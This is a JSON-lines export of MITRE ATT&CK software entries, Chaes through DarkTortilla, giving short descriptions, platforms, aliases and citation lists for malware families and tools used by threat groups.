{"ID":"S0631","name":"Chaes","description":"[Chaes](https://attack.mitre.org/software/S0631) is a multistage information stealer written in several programming languages that collects login credentials, credit card numbers, and other financial information. [Chaes](https://attack.mitre.org/software/S0631) was first observed in 2020, and appears to primarily target victims in Brazil as well as other e-commerce customers in Latin America.(Citation: Cybereason Chaes Nov 2020)","url":"https://attack.mitre.org/software/S0631","created":"30 June 2021","last modified":"24 March 2023","version":"1.1","contributors":"Daniyal Naeem, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Cybereason Chaes Nov 2020)"}
{"ID":"S0220","name":"Chaos","description":"[Chaos](https://attack.mitre.org/software/S0220) is Linux malware that compromises systems by brute force attacks against SSH services. Once installed, it provides a reverse shell to its controllers, triggered by unsolicited packets. (Citation: Chaos Stolen Backdoor)","url":"https://attack.mitre.org/software/S0220","created":"18 April 2018","last modified":"01 July 2020","version":"1.1","contributors":null,"platforms":"Linux","aliases":null,"type":"malware","relationship citations":",,(Citation: Chaos Stolen Backdoor)"}
{"ID":"S0674","name":"CharmPower","description":"[CharmPower](https://attack.mitre.org/software/S0674) is a PowerShell-based, modular backdoor that has been used by [Magic Hound](https://attack.mitre.org/groups/G0059) since at least 2022.(Citation: Check Point APT35 CharmPower January 2022)","url":"https://attack.mitre.org/software/S0674","created":"24 January 2022","last modified":"25 January 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Check Point APT35 CharmPower January 2022),,(Citation: Check Point APT35 CharmPower January 2022)"}
{"ID":"S0107","name":"Cherry Picker","description":"[Cherry Picker](https://attack.mitre.org/software/S0107) is a point of sale (PoS) memory scraper. (Citation: Trustwave Cherry Picker)","url":"https://attack.mitre.org/software/S0107","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Trustwave Cherry Picker)"}
{"ID":"S0020","name":"China Chopper","description":"[China Chopper](https://attack.mitre.org/software/S0020) is a [Web Shell](https://attack.mitre.org/techniques/T1505/003) hosted on Web servers to provide access back into an enterprise network that does not rely on an infected system calling back to a remote command and control server.(Citation: Lee 2013) It has been used by several threat groups.(Citation: Dell TG-3390)(Citation: FireEye Periscope March 2018)(Citation: CISA AA21-200A APT40 July 2021)(Citation: Rapid7 HAFNIUM Mar 2021)","url":"https://attack.mitre.org/software/S0020","created":"31 May 2017","last modified":"10 April 2023","version":"2.4","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Dell TG-3390),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Microsoft GALLIUM December 2019),(Citation: Cybereason Soft Cell June 2019),(Citation: Volexity Exchange Marauder March 2021),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: FireEye Periscope March 2018),(Citation: FireEye Exchange Zero Days March 2021),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Unit42 Emissary Panda May 2019),(Citation: FireEye APT41 Aug 2019),(Citation: Accenture MUDCARP March 2019),(Citation: CISA AA21-200A APT40 July 2021),,(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Lee 2013),(Citation: FireEye Periscope March 2018),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: NCSC Joint Report Public Tools)"}
{"ID":"S1041","name":"Chinoxy","description":"[Chinoxy](https://attack.mitre.org/software/S1041) is a backdoor that has been used since at least November 2018, during the [FunnyDream](https://attack.mitre.org/campaigns/C0007) campaign, to gain persistence and drop additional payloads. According to security researchers, [Chinoxy](https://attack.mitre.org/software/S1041) has been used by Chinese-speaking threat actors.(Citation: Bitdefender FunnyDream Campaign November 2020)","url":"https://attack.mitre.org/software/S1041","created":"21 September 2022","last modified":"10 October 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Bitdefender FunnyDream Campaign November 2020)"}
{"ID":"S0667","name":"Chrommme","description":"[Chrommme](https://attack.mitre.org/software/S0667) is a backdoor tool written using the Microsoft Foundation Class (MFC) framework that was first reported in June 2021; security researchers noted infrastructure overlaps with [Gelsemium](https://attack.mitre.org/software/S0666) malware.(Citation: ESET Gelsemium June 2021)","url":"https://attack.mitre.org/software/S0667","created":"01 December 2021","last modified":"04 May 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: ESET Gelsemium June 2021)"}
{"ID":"S0660","name":"Clambling","description":"[Clambling](https://attack.mitre.org/software/S0660) is a modular backdoor written in C++ that has been used by [Threat Group-3390](https://attack.mitre.org/groups/G0027) since at least 2017.(Citation: Trend Micro DRBControl February 2020)","url":"https://attack.mitre.org/software/S0660","created":"12 November 2021","last modified":"23 November 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Trend Micro Iron Tiger April 2021),(Citation: Profero APT27 December 2020),(Citation: Trend Micro DRBControl February 2020),,(Citation: Talent-Jump Clambling February 2020),(Citation: Trend Micro DRBControl February 2020)"}
{"ID":"S0611","name":"Clop","description":"[Clop](https://attack.mitre.org/software/S0611) is a ransomware family that was first observed in February 2019 and has been used against retail, transportation and logistics, education, manufacturing, engineering, automotive, energy, financial, aerospace, telecommunications, professional and legal services, healthcare, and high tech industries. [Clop](https://attack.mitre.org/software/S0611) is a variant of the CryptoMix ransomware.(Citation: Mcafee Clop Aug 2019)(Citation: Cybereason Clop Dec 2020)(Citation: Unit42 Clop April 2021) ","url":"https://attack.mitre.org/software/S0611","created":"10 May 2021","last modified":"15 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Cybereason Clop Dec 2020),(Citation: Unit42 Clop April 2021),,(Citation: Cybereason Clop Dec 2020),(Citation: Unit42 Clop April 2021),(Citation: Mcafee Clop Aug 2019)"}
{"ID":"S0054","name":"CloudDuke","description":"[CloudDuke](https://attack.mitre.org/software/S0054) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) in 2015. (Citation: F-Secure The Dukes) (Citation: Securelist Minidionis July 2015)","url":"https://attack.mitre.org/software/S0054","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"CloudLook, MiniDionis","type":"malware","relationship citations":"(Citation: F-Secure The Dukes),,(Citation: F-Secure The Dukes)"}
{"ID":"S0154","name":"Cobalt Strike","description":"[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual)\n\nIn addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)","url":"https://attack.mitre.org/software/S0154","created":"14 December 2017","last modified":"07 March 2023","version":"1.10","contributors":"Josh Abraham; Martin Sohn Christensen, Improsec","platforms":"Linux, Windows, macOS","aliases":null,"type":"malware","relationship citations":"(Citation: TrendMicro EarthLusca 2022),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: NCC Group Chimera January 2021),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Volexity OceanLotus Nov 2017),(Citation: FBI Flash FIN7 USB),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Securelist APT10 March 2021),(Citation: Talos Cobalt Group July 2018),(Citation: Trend Micro DRBControl February 2020),(Citation: Crowdstrike Global Threat Report Feb 2018),(Citation: Volexity Ocean Lotus November 2020),(Citation: Cybereason Oceanlotus May 2017),(Citation: Secureworks IRON RITUAL Profile),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Proofpoint Cobalt June 2017),(Citation: RiskIQ Cobalt Nov 2017),(Citation: Proofpoint Leviathan Oct 2017),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Recorded Future REDDELTA July 2020),(Citation: DFIR Ryuk in 5 Hours October 2020),(Citation: Unit 42 Playbook Dec 2017),(Citation: MSTIC NOBELIUM May 2021),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: SentinelOne NobleBaron June 2021),(Citation: Secureworks IRON RITUAL USAID Phish May 2021),(Citation: FireEye APT32 May 2017),(Citation: ESET T3 Threat Report 2021),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Unit 42 KerrDown February 2019),(Citation: NCC Group TA505),(Citation: FireEye APT41 March 2020),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: FireEye FIN6 Apr 2019),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Bitdefender LuminousMoth July 2021),(Citation: McAfee Dianxun March 2021),(Citation: Sophos New Ryuk Attack October 2020),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Cycraft Chimera April 2020),(Citation: RiskIQ Cobalt Jan 2018),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: Group IB Cobalt Aug 2017),(Citation: DFIR Ryuk's Return October 2020),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Group IB APT 41 June 2021),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: FireEye Periscope March 2018),(Citation: FireEye APT19),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Crowdstrike EvilCorp March 2021),(Citation: Cybereason Cobalt Kitty 2017),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Mandiant APT41),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Microsoft Unidentified Dec 2018),(Citation: FireEye APT29 Nov 2018),(Citation: Cisco Talos Avos Jun 2022),(Citation: cobaltstrike manual),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: DFIR Conti Bazar Nov 2021),(Citation: CobaltStrike Scripted Web Delivery),(Citation: Cybereason Bumblebee August 2022),(Citation: Securelist APT10 March 2021),(Citation: Cyberreason Anchor December 2019),(Citation: Talos Cobalt Strike September 2020),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Cobalt Strike DCOM Jan 2017),(Citation: CobaltStrike Daddy May 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Trend Micro Black Basta October 2022)"}
{"ID":"S0338","name":"Cobian RAT","description":"[Cobian RAT](https://attack.mitre.org/software/S0338) is a backdoor, remote access tool that has been observed since 2016.(Citation: Zscaler Cobian Aug 2017)","url":"https://attack.mitre.org/software/S0338","created":"29 January 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Zscaler Cobian Aug 2017)"}
{"ID":"S0369","name":"CoinTicker","description":"[CoinTicker](https://attack.mitre.org/software/S0369) is a malicious application that poses as a cryptocurrency price ticker and installs components of the open source backdoors EvilOSX and EggShell.(Citation: CoinTicker 2019)","url":"https://attack.mitre.org/software/S0369","created":"23 April 2019","last modified":"30 March 2020","version":"1.1","contributors":"Richie Cyrus, SpecterOps","platforms":"macOS","aliases":null,"type":"malware","relationship citations":",,(Citation: CoinTicker 2019)"}
{"ID":"S0126","name":"ComRAT","description":"[ComRAT](https://attack.mitre.org/software/S0126) is a second stage implant suspected of being a descendant of [Agent.btz](https://attack.mitre.org/software/S0092) and used by [Turla](https://attack.mitre.org/groups/G0010). The first version of [ComRAT](https://attack.mitre.org/software/S0126) was identified in 2007, but the tool has undergone substantial development for many years since.(Citation: Symantec Waterbug)(Citation: NorthSec 2015 GData Uroburos Tools)(Citation: ESET ComRAT May 2020)","url":"https://attack.mitre.org/software/S0126","created":"31 May 2017","last modified":"22 March 2023","version":"1.4","contributors":"Matthieu Faou, ESET","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: Symantec Waterbug),(Citation: Secureworks IRON HUNTER Profile),,(Citation: ESET ComRAT May 2020),(Citation: CISA ComRAT Oct 2020),(Citation: NorthSec 2015 GData Uroburos Tools)"}
{"ID":"S0244","name":"Comnie","description":"[Comnie](https://attack.mitre.org/software/S0244) is a remote backdoor which has been used in attacks in East Asia. (Citation: Palo Alto Comnie)","url":"https://attack.mitre.org/software/S0244","created":"17 October 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Palo Alto Comnie)"}
{"ID":"S0608","name":"Conficker","description":"[Conficker](https://attack.mitre.org/software/S0608) is a computer worm first detected in October 2008 that targeted Microsoft Windows using the MS08-067 Windows vulnerability to spread.(Citation: SANS Conficker) In 2016, a variant of [Conficker](https://attack.mitre.org/software/S0608) made its way on computers and removable disk drives belonging to a nuclear power plant.(Citation: Conficker Nuclear Power Plant)","url":"https://attack.mitre.org/software/S0608","created":"23 February 2021","last modified":"08 March 2023","version":"1.0","contributors":null,"platforms":"Windows","aliases":"Downadup, Kido","type":"malware","relationship citations":",,(Citation: Trend Micro Conficker),(Citation: SANS Conficker)"}
{"ID":"S0591","name":"ConnectWise","description":"[ConnectWise](https://attack.mitre.org/software/S0591) is a legitimate remote administration tool that has been used since at least 2016 by threat actors including [MuddyWater](https://attack.mitre.org/groups/G0069) and [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) to connect to and conduct lateral movement in target environments.(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021)","url":"https://attack.mitre.org/software/S0591","created":"18 March 2021","last modified":"13 April 2023","version":"1.0","contributors":null,"platforms":"Windows","aliases":"ScreenConnect","type":"tool","relationship citations":"(Citation: Anomali Static Kitten February 2021),(Citation: Tetra Defense Sodinokibi March 2020),(Citation: Trend Micro Muddy Water March 2021),,(Citation: Anomali Static Kitten February 2021)"}
{"ID":"S0575","name":"Conti","description":"[Conti](https://attack.mitre.org/software/S0575) is a Ransomware-as-a-Service (RaaS) that was first observed in December 2019. [Conti](https://attack.mitre.org/software/S0575) has been deployed via [TrickBot](https://attack.mitre.org/software/S0266) and used against major corporations and government agencies, particularly those in North America. As with other ransomware families, actors using [Conti](https://attack.mitre.org/software/S0575) steal sensitive files and information from compromised networks, and threaten to publish this data unless the ransom is paid.(Citation: Cybereason Conti Jan 2021)(Citation: CarbonBlack Conti July 2020)(Citation: Cybleinc Conti January 2020)","url":"https://attack.mitre.org/software/S0575","created":"17 February 2021","last modified":"29 September 2022","version":"2.1","contributors":"Daniyal Naeem, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CrowdStrike Wizard Spider October 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Cybleinc Conti January 2020),(Citation: CarbonBlack Conti July 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: Cybereason Conti Jan 2021)"}
{"ID":"S0492","name":"CookieMiner","description":"[CookieMiner](https://attack.mitre.org/software/S0492) is mac-based malware that targets information associated with cryptocurrency exchanges as well as enabling cryptocurrency mining on the victim system itself. It was first discovered in the wild in 2019.(Citation: Unit42 CookieMiner Jan 2019)","url":"https://attack.mitre.org/software/S0492","created":"22 July 2020","last modified":"22 March 2023","version":"1.1","contributors":null,"platforms":"macOS","aliases":null,"type":"malware","relationship citations":",,(Citation: Unit42 CookieMiner Jan 2019)"}
{"ID":"S0050","name":"CosmicDuke","description":"[CosmicDuke](https://attack.mitre.org/software/S0050) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. (Citation: F-Secure The Dukes)","url":"https://attack.mitre.org/software/S0050","created":"31 May 2017","last modified":"28 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"BotgenStudios, NemesisGemina, TinyBaron","type":"malware","relationship citations":"(Citation: Secureworks IRON HEMLOCK Profile),(Citation: F-Secure The Dukes),,(Citation: F-Secure Cosmicduke),(Citation: F-Secure The Dukes)"}
{"ID":"S0614","name":"CostaBricks","description":"[CostaBricks](https://attack.mitre.org/software/S0614) is a loader that was used to deploy 32-bit backdoors in the [CostaRicto](https://attack.mitre.org/groups/G0132) campaign.(Citation: BlackBerry CostaRicto November 2020)","url":"https://attack.mitre.org/software/S0614","created":"24 May 2021","last modified":"05 October 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",(Citation: BlackBerry CostaRicto November 2020),(Citation: BlackBerry CostaRicto November 2020)"}
{"ID":"S0046","name":"CozyCar","description":"[CozyCar](https://attack.mitre.org/software/S0046) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. It is a modular malware platform, and its backdoor component can be instructed to download and execute a variety of modules with different functionality. (Citation: F-Secure The Dukes)","url":"https://attack.mitre.org/software/S0046","created":"31 May 2017","last modified":"28 March 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":"Cozer, CozyBear, CozyDuke, EuroAPT","type":"malware","relationship citations":"(Citation: Secureworks IRON HEMLOCK Profile),(Citation: F-Secure The Dukes),,(Citation: F-Secure CozyDuke)"}
{"ID":"S0488","name":"CrackMapExec","description":"[CrackMapExec](https://attack.mitre.org/software/S0488), or CME, is a post-exploitation tool developed in Python and designed for penetration testing against networks. [CrackMapExec](https://attack.mitre.org/software/S0488) collects Active Directory information to conduct lateral movement through targeted networks.(Citation: CME Github September 2018)","url":"https://attack.mitre.org/software/S0488","created":"17 July 2020","last modified":"29 July 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: Secureworks IRON LIBERTY July 2019),(Citation: Symantec MuddyWater Dec 2018),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: US-CERT TA18-074A),(Citation: BitDefender Chafer May 2020),(Citation: FireEye APT39 Jan 2019),,(Citation: CME Github September 2018)"}
{"ID":"S1023","name":"CreepyDrive","description":"[CreepyDrive](https://attack.mitre.org/software/S1023) is a custom implant has been used by [POLONIUM](https://attack.mitre.org/groups/G1005) since at least early 2022 for C2 with and exfiltration to actor-controlled OneDrive accounts.(Citation: Microsoft POLONIUM June 2022)\n\n[POLONIUM](https://attack.mitre.org/groups/G1005) has used a similar implant called CreepyBox that relies on actor-controlled DropBox accounts.(Citation: Microsoft POLONIUM June 2022)","url":"https://attack.mitre.org/software/S1023","created":"07 July 2022","last modified":"10 August 2022","version":"1.0","contributors":null,"platforms":"Office 365, Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Microsoft POLONIUM June 2022),,(Citation: Microsoft POLONIUM June 2022)"}
{"ID":"S1024","name":"CreepySnail","description":"[CreepySnail](https://attack.mitre.org/software/S1024) is a custom PowerShell implant that has been used by [POLONIUM](https://attack.mitre.org/groups/G1005) since at least 2022.(Citation: Microsoft POLONIUM June 2022)","url":"https://attack.mitre.org/software/S1024","created":"08 July 2022","last modified":"08 August 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Microsoft POLONIUM June 2022),,(Citation: Microsoft POLONIUM June 2022)"}
{"ID":"S0115","name":"Crimson","description":"[Crimson](https://attack.mitre.org/software/S0115) is a remote access Trojan that has been used by [Transparent Tribe](https://attack.mitre.org/groups/G0134) since at least 2016.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)","url":"https://attack.mitre.org/software/S0115","created":"31 May 2017","last modified":"26 March 2023","version":"1.3","contributors":null,"platforms":"Windows","aliases":"MSIL/Crimson","type":"malware","relationship citations":"(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Kaspersky Transparent Tribe August 2020)"}
{"ID":"S0235","name":"CrossRAT","description":"[CrossRAT](https://attack.mitre.org/software/S0235) is a cross platform RAT.","url":"https://attack.mitre.org/software/S0235","created":"17 October 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Linux, Windows, macOS","aliases":null,"type":"malware","relationship citations":"(Citation: Lookout Dark Caracal Jan 2018),,(Citation: Lookout Dark Caracal Jan 2018)"}
{"ID":"S0538","name":"Crutch","description":"[Crutch](https://attack.mitre.org/software/S0538) is a backdoor designed for document theft that has been used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2015.(Citation: ESET Crutch December 2020)","url":"https://attack.mitre.org/software/S0538","created":"04 December 2020","last modified":"22 December 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Talos TinyTurla September 2021),(Citation: ESET Crutch December 2020),,(Citation: ESET Crutch December 2020)"}
{"ID":"S0498","name":"Cryptoistic","description":"[Cryptoistic](https://attack.mitre.org/software/S0498) is a backdoor, written in Swift, that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032).(Citation: SentinelOne Lazarus macOS July 2020)","url":"https://attack.mitre.org/software/S0498","created":"10 August 2020","last modified":"18 August 2020","version":"1.0","contributors":null,"platforms":"macOS","aliases":null,"type":"malware","relationship citations":"(Citation: SentinelOne Lazarus macOS July 2020),,(Citation: SentinelOne Lazarus macOS July 2020)"}
{"ID":"S0625","name":"Cuba","description":"\n[Cuba](https://attack.mitre.org/software/S0625) is a Windows-based ransomware family that has been used against financial institutions, technology, and logistics organizations in North and South America as well as Europe since at least December 2019.(Citation: McAfee Cuba April 2021)","url":"https://attack.mitre.org/software/S0625","created":"18 June 2021","last modified":"12 October 2021","version":"1.0","contributors":"Daniyal Naeem, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: McAfee Cuba April 2021)"}
{"ID":"S0687","name":"Cyclops Blink","description":"[Cyclops Blink](https://attack.mitre.org/software/S0687) is a modular malware that has been used in widespread campaigns by [Sandworm Team](https://attack.mitre.org/groups/G0034) since at least 2019 to target Small/Home Office (SOHO) network devices, including WatchGuard and Asus.(Citation: NCSC Cyclops Blink February 2022)(Citation: NCSC CISA Cyclops Blink Advisory February 2022)(Citation: Trend Micro Cyclops Blink March 2022)","url":"https://attack.mitre.org/software/S0687","created":"03 March 2022","last modified":"14 April 2022","version":"1.0","contributors":null,"platforms":"Network","aliases":null,"type":"malware","relationship citations":"(Citation: Trend Micro Cyclops Blink March 2022),(Citation: NCSC CISA Cyclops Blink Advisory February 2022),,(Citation: Trend Micro Cyclops Blink March 2022),(Citation: NCSC CISA Cyclops Blink Advisory February 2022),(Citation: NCSC Cyclops Blink February 2022)"}
{"ID":"S1033","name":"DCSrv","description":"[DCSrv](https://attack.mitre.org/software/S1033) is destructive malware that has been used by [Moses Staff](https://attack.mitre.org/groups/G1009) since at least  September 2021. Though [DCSrv](https://attack.mitre.org/software/S1033) has ransomware-like capabilities, [Moses Staff](https://attack.mitre.org/groups/G1009) does not demand ransom or offer a decryption key.(Citation: Checkpoint MosesStaff Nov 2021)","url":"https://attack.mitre.org/software/S1033","created":"11 August 2022","last modified":"24 October 2022","version":"1.0","contributors":"Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Checkpoint MosesStaff Nov 2021),,(Citation: Checkpoint MosesStaff Nov 2021)"}
{"ID":"S0255","name":"DDKONG","description":"[DDKONG](https://attack.mitre.org/software/S0255) is a malware sample that was part of a campaign by [Rancor](https://attack.mitre.org/groups/G0075). [DDKONG](https://attack.mitre.org/software/S0255) was first seen used in February 2017. (Citation: Rancor Unit42 June 2018)","url":"https://attack.mitre.org/software/S0255","created":"17 October 2018","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"malware","relationship citations":"(Citation: Rancor Unit42 June 2018),,(Citation: Rancor Unit42 June 2018)"}
{"ID":"S1052","name":"DEADEYE","description":"[DEADEYE](https://attack.mitre.org/software/S1052) is a malware launcher that has been used by [APT41](https://attack.mitre.org/groups/G0096) since at least May 2021. [DEADEYE](https://attack.mitre.org/software/S1052) has variants that can either embed a payload inside a compiled binary (DEADEYE.EMBED) or append it to the end of a file (DEADEYE.APPEND).(Citation: Mandiant APT41)","url":"https://attack.mitre.org/software/S1052","created":"20 December 2022","last modified":"07 April 2023","version":"1.0","contributors":null,"platforms":"Windows","aliases":"DEADEYE.APPEND, DEADEYE.EMBED","type":"malware","relationship citations":",(Citation: Mandiant APT41),(Citation: Mandiant APT41)"}
{"ID":"S0616","name":"DEATHRANSOM","description":"[DEATHRANSOM](https://attack.mitre.org/software/S0616) is ransomware written in C that has been used since at least 2020, and has potential overlap with [FIVEHANDS](https://attack.mitre.org/software/S0618) and [HELLOKITTY](https://attack.mitre.org/software/S0617).(Citation: FireEye FiveHands April 2021)","url":"https://attack.mitre.org/software/S0616","created":"02 June 2021","last modified":"18 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: FireEye FiveHands April 2021)"}
{"ID":"S0213","name":"DOGCALL","description":"[DOGCALL](https://attack.mitre.org/software/S0213) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067) that has been used to target South Korean government and military organizations in 2017. It is typically dropped using a Hangul Word Processor (HWP) exploit. (Citation: FireEye APT37 Feb 2018)","url":"https://attack.mitre.org/software/S0213","created":"18 April 2018","last modified":"30 March 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT37 Feb 2018),(Citation: Unit 42 Nokki Oct 2018),,(Citation: FireEye APT37 Feb 2018),(Citation: Unit 42 Nokki Oct 2018)"}
{"ID":"S0694","name":"DRATzarus","description":"[DRATzarus](https://attack.mitre.org/software/S0694) is a remote access tool (RAT) that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032) to target the defense and aerospace organizations globally since at least summer 2020. [DRATzarus](https://attack.mitre.org/software/S0694) shares similarities with [Bankshot](https://attack.mitre.org/software/S0239), which was used by [Lazarus Group](https://attack.mitre.org/groups/G0032) in 2017 to target the Turkish financial sector.(Citation: ClearSky Lazarus Aug 2020)","url":"https://attack.mitre.org/software/S0694","created":"24 March 2022","last modified":"17 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",(Citation: ClearSky Lazarus Aug 2020),(Citation: ClearSky Lazarus Aug 2020)"}
{"ID":"S0497","name":"Dacls","description":"[Dacls](https://attack.mitre.org/software/S0497) is a multi-platform remote access tool used by [Lazarus Group](https://attack.mitre.org/groups/G0032) since at least December 2019.(Citation: TrendMicro macOS Dacls May 2020)(Citation: SentinelOne Lazarus macOS July 2020)","url":"https://attack.mitre.org/software/S0497","created":"07 August 2020","last modified":"02 September 2020","version":"1.0","contributors":null,"platforms":"Linux, Windows, macOS","aliases":null,"type":"malware","relationship citations":"(Citation: SentinelOne Lazarus macOS July 2020),(Citation: TrendMicro macOS Dacls May 2020),,(Citation: SentinelOne Lazarus macOS July 2020),(Citation: TrendMicro macOS Dacls May 2020)"}
{"ID":"S1014","name":"DanBot","description":"[DanBot](https://attack.mitre.org/software/S1014) is a first-stage remote access Trojan written in C# that has been used by [HEXANE](https://attack.mitre.org/groups/G1001) since at least 2018.(Citation: SecureWorks August 2019)","url":"https://attack.mitre.org/software/S1014","created":"03 June 2022","last modified":"01 September 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: SecureWorks August 2019),,(Citation: ClearSky Siamesekitten August 2021),(Citation: SecureWorks August 2019)"}
{"ID":"S0334","name":"DarkComet","description":"[DarkComet](https://attack.mitre.org/software/S0334) is a Windows remote administration tool and backdoor.(Citation: TrendMicro DarkComet Sept 2014)(Citation: Malwarebytes DarkComet March 2018)","url":"https://attack.mitre.org/software/S0334","created":"29 January 2019","last modified":"28 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"DarkKomet, FYNLOS, Fynloski, Krademok","type":"malware","relationship citations":"(Citation: FireEye APT38 Oct 2018),(Citation: Unit42 SilverTerrier 2018),(Citation: Unit 42 ProjectM March 2016),,(Citation: Malwarebytes DarkComet March 2018),(Citation: TrendMicro DarkComet Sept 2014)"}
{"ID":"S1066","name":"DarkTortilla","description":"[DarkTortilla](https://attack.mitre.org/software/S1066) is a highly configurable .NET-based crypter that has been possibly active since at least August 2015. [DarkTortilla](https://attack.mitre.org/software/S1066) has been used to deliver popular information stealers, RATs, and payloads such as [Agent Tesla](https://attack.mitre.org/software/S0331), AsyncRat, [NanoCore](https://attack.mitre.org/software/S0336), RedLine, [Cobalt Strike](https://attack.mitre.org/software/S0154), and Metasploit.(Citation: Secureworks DarkTortilla Aug 2022)","url":"https://attack.mitre.org/software/S1066","created":"16 February 2023","last modified":"06 March 2023","version":"1.0","contributors":"Mindaugas Gudzis, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Secureworks DarkTortilla Aug 2022)"}
